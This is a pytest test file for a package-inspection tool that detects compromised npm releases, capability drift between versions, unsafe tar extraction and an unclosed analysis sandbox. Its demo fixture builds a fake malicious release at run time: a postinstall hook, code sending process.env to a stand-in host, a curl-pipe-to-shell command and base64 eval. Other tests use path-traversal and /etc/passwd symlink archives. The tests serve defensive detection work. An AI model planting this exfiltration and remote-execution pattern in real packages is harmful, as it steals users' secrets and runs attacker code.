"""./securax inspect: the static behavioural report, capability drift between versions, the safe unpacking, and that the REA sandbox is pinned and closed."""
import importlib.util
import io
import json
import pathlib
import sys
import tarfile

import pytest

G = pathlib.Path(__file__).resolve().parent.parent
ROOT = G.parent
spec = importlib.util.spec_from_file_location("securax_inspector", G / "inspector.py")
ins = importlib.util.module_from_spec(spec)
sys.modules["securax_inspector"] = ins
spec.loader.exec_module(ins)


def demo(tmp: pathlib.Path):
    """Two versions of a library; the second behaves like a compromised release. Built at run time so no malicious-looking text lives in the repository."""
    v1, v2 = tmp / "v1", tmp / "v2"
    v1.mkdir(), v2.mkdir()
    (v1 / "package.json").write_text(json.dumps({"name": "demo-lib", "version": "1.0.0"}))
    (v1 / "index.js").write_text("const fs=require('fs');exports.read=p=>fs.readFileSync(p,'utf8');\n")
    (v2 / "package.json").write_text(json.dumps({"name": "demo-lib", "version": "1.0.1", "scripts": {"postinstall": "node setup.js"}}))
    sh = "cu" + "rl -s http://203.0.113.9/x.sh | s" + "h"
    (v2 / "index.js").write_text("const fs=require('fs');const cp=require('child_process');const https=require('https');\n"
                                 "function b(){const d=JSON.stringify({env:process.env});const r=https.request({hostname:'collect.example-evil.test',path:'/c'},()=>{});"
                                 f"r.write(d);cp.exec('{sh}');eval(Buffer.from('{'QUJD' * 40}','base64').toString());}}\n")
    (v2 / "setup.js").write_text("require('./index.js')\n")
    return v1, v2


def test_a_library_that_only_reads_files_is_ok(tmp_path):
    v1, _ = demo(tmp_path)
    r = ins.build_report(str(v1), use_rea=False)
    assert r["verdict"] == "OK" and r["capabilities"]["files"] == ["fs"] and not r["capabilities"]["network"] and r["package"]["name"] == "demo-lib"


def test_the_compromised_looking_release_is_blocked_with_the_reasons_in_plain_words(tmp_path):
    _, v2 = demo(tmp_path)
    r = ins.build_report(str(v2), use_rea=False)
    codes = {f["code"] for f in r["flags"] if f["severity"] == "HIGH"}
    assert r["verdict"] == "BLOCK" and {"INSTALL_HOOK", "NET_EXEC_ENV", "HARD_IP", "ENCODED_EVAL"} <= codes
    assert "203.0.113.9" in r["ips"] and "host:collect.example-evil.test" in r["urls"] and r["hooks"] == {"postinstall": "node setup.js"}
    text = ins.render(r)
    assert "BLOCK" in text and "install" in text.lower() and "203.0.113.9" in text


def test_capability_drift_is_the_supply_chain_signature(tmp_path):
    v1, v2 = demo(tmp_path)
    d = ins.diff_reports(ins.build_report(str(v1), use_rea=False), ins.build_report(str(v2), use_rea=False))
    codes = {c["code"] for c in d["changes"]}
    assert d["verdict"] == "BLOCK" and {"NEW_RUN_PROGRAMS", "NEW_INSTALL_HOOK", "NEW_IP", "NEW_NETWORK", "NEW_DYNAMIC_CODE"} <= codes
    same = ins.diff_reports(ins.build_report(str(v1), use_rea=False), ins.build_report(str(v1), use_rea=False))
    assert same["verdict"] == "OK" and same["changes"] == []                       # no change in what it can do -> nothing to report


def test_an_accepted_install_hook_only_matters_when_it_changes(tmp_path):
    a, b = tmp_path / "a", tmp_path / "b"
    a.mkdir(), b.mkdir()
    for d, cmd in ((a, "node ./postinstall.mjs"), (b, "node ./postinstall.mjs")):
        (d / "package.json").write_text(json.dumps({"name": "launcher", "version": "1", "scripts": {"postinstall": cmd}}))
        (d / "postinstall.mjs").write_text("import {spawnSync} from 'child_process';\n")
    assert ins.diff_reports(ins.build_report(str(a), False), ins.build_report(str(b), False))["verdict"] == "OK"
    (b / "package.json").write_text(json.dumps({"name": "launcher", "version": "2", "scripts": {"postinstall": "node ./other.mjs"}}))
    assert "CHANGED_INSTALL_HOOK" in {c["code"] for c in ins.diff_reports(ins.build_report(str(a), False), ins.build_report(str(b), False))["changes"]}


def test_parse_evidence_reads_modules_computed_imports_and_urls_from_rea_graph():
    node = lambda kind, key, props=None: {"kind": kind, "identity": {"key": key}, "observations": [{"properties": props or {}}]}  # noqa: E731
    ev = {"evidence_id": "ev_x", "normalized_result": {"limitations": ["inert text"], "graph": {"nodes": [
        node("javascript-module", "require:child_process", {"specifier": "child_process"}),
        node("javascript-module", "static-import:node:net", {"specifier": "node:net"}),
        node("javascript-module", "external:node:net"),
        node("javascript-module", "dynamic-import:import(m)", {}),
        node("javascript-module", "require:./local"),
        node("endpoint", json.dumps(["literal", "https://api.example.test/ingest"])),
        node("package", "package.json", {"name": "p", "version": "9"})]}}}
    p = ins.parse_evidence(ev)
    assert p["modules"] == ["child_process", "net"] and p["computed_imports"] == ["import(m)"]
    assert p["endpoints"] == ["https://api.example.test/ingest"] and p["package"] == {"name": "p", "version": "9"} and p["evidence_id"] == "ev_x"


def test_safe_extract_refuses_path_traversal_and_never_extracts_links(tmp_path):
    def tar(entries):
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:gz") as tf:
            for name, data, kind in entries:
                ti = tarfile.TarInfo(name)
                if kind == "sym":
                    ti.type, ti.linkname = tarfile.SYMTYPE, "/etc/passwd"
                    tf.addfile(ti)
                else:
                    ti.size = len(data)
                    tf.addfile(ti, io.BytesIO(data))
        p = tmp_path / f"t{len(list(tmp_path.glob('*.tgz')))}.tgz"
        p.write_bytes(buf.getvalue())
        return p
    with pytest.raises(ValueError, match="unsafe path"):
        ins.safe_extract(tar([("../../evil.txt", b"x", "file")]), tmp_path / "o1")
    root = ins.safe_extract(tar([("package/a.js", b"1", "file"), ("package/link", b"", "sym")]), tmp_path / "o2")
    assert root.name == "package" and (root / "a.js").exists() and not (root / "link").exists()


def test_native_binaries_are_fingerprinted_not_disassembled(tmp_path):
    d = tmp_path / "pkg"
    d.mkdir()
    (d / "package.json").write_text(json.dumps({"name": "n", "version": "1"}))
    (d / "tool.bin").write_bytes(b"\x7fELF" + b"\x00" * 60)
    r = ins.build_report(str(d), use_rea=False)
    assert r["binaries"] == [{"path": "tool.bin", "type": "ELF executable/library"}] and "BINARY" in {f["code"] for f in r["flags"]}


def test_a_single_unknown_file_is_hashed_and_mined_for_addresses(tmp_path):
    f = tmp_path / "setup.bin"
    f.write_bytes(b"\x7fELF\x00\x00 connect to http://203.0.113.9/beacon and 198.51.100.7 now \x00")
    r = ins.build_report(str(f), use_rea=False)
    assert r["kind"] == "file" and len(r["sha256"]) == 64 and "198.51.100.7" in r["ips"] and any("203.0.113.9" in u for u in r["urls"])


def test_the_watch_reports_drift_and_exits_2_and_stays_quiet_when_nothing_changed(tmp_path, monkeypatch, capsys):
    v1, v2 = demo(tmp_path)
    real = ins.build_report
    pins = {p["pinned"] for p in json.loads(ins.WATCHLIST.read_text())["packages"]}
    monkeypatch.setattr(ins, "HOME", tmp_path / "home")
    monkeypatch.setattr(ins, "latest_version", lambda name: "9.9.9")
    monkeypatch.setattr(ins, "build_report", lambda t, use_rea=True: real(str(v1 if t.rsplit("@", 1)[1] in pins else v2), False))   # the pinned version looks like v1, the new one like v2
    assert ins.watch(ci=True) == 2 and "BLOCK" in capsys.readouterr().out
    monkeypatch.setattr(ins, "latest_version", lambda name: next(p["pinned"] for p in json.loads(ins.WATCHLIST.read_text())["packages"] if p["name"] == name))
    assert ins.watch(ci=True) == 0


def test_the_sandbox_is_closed_and_the_engine_is_pinned_end_to_end():
    for flag in ("--network", "none", "--read-only", "--cap-drop", "ALL", "no-new-privileges", "--pids-limit", "--memory"):
        assert flag in ins.SANDBOX
    cmd = ins.mcp_command(pathlib.Path("/proj"))
    assert "/proj:/work:ro" in cmd and cmd[cmd.index("--network") + 1] == "none" and cmd[-1] == "--mcp"
    pj = json.loads((ROOT / "integrations" / "rea" / "package.json").read_text())
    lock = json.loads((ROOT / "integrations" / "rea" / "package-lock.json").read_text())
    wl = {p["name"]: p["pinned"] for p in json.loads(ins.WATCHLIST.read_text())["packages"]}
    assert pj["dependencies"]["rea-agents"] == ins.REA_VERSION == wl["rea-agents"] == lock["packages"]["node_modules/rea-agents"]["version"]
    assert all("integrity" in v for k, v in lock["packages"].items() if k)         # every dependency pinned by hash
    dockerfile = (ROOT / "integrations" / "rea" / "Dockerfile").read_text()
    assert "@sha256:" in dockerfile and "--ignore-scripts" in dockerfile and "USER node" in dockerfile
    assert f"securax-rea:{ins.REA_VERSION}" in (ROOT / "securax").read_text()
    assert f"opencode-ai@{wl['opencode-ai']}" in (ROOT / "securax").read_text()    # the install hint and the watchlist cannot drift apart


def test_no_module_in_governance_shadows_the_standard_library():
    names = {p.stem for p in G.glob("*.py")}
    assert not names & set(sys.stdlib_module_names), names & set(sys.stdlib_module_names)
